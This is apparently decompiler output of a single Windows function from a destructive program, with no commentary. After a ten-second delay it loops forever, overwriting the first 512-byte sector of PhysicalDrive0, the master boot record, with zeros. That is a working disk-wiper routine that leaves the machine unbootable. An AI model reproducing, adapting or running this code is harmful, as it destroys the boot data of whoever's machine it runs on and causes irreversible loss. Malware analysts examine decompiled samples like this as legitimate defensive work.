void FUN_140011aa0(void)

{
  undefined1 *hFile;
  undefined1 auStackY_268 [32];
  DWORD local_228 [4];
  undefined1 local_218 [512];
  ulonglong local_18;
  
  local_18 = DAT_140068100 ^ (ulonglong)auStackY_268;
  Sleep(10000);
  do {
    FUN_140049100(local_218,0,0x200);
    hFile = CreateFileW(L"\\\\.\\PhysicalDrive0",0x10000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                        (HANDLE)0x0);
    if (hFile != &DAT_ffffffffffffffff) {
      local_228[0] = 0;
      WriteFile(hFile,local_218,0x200,local_228,(LPOVERLAPPED)0x0);
      CloseHandle(hFile);
    }
    Sleep(200);
  } while( true );
}
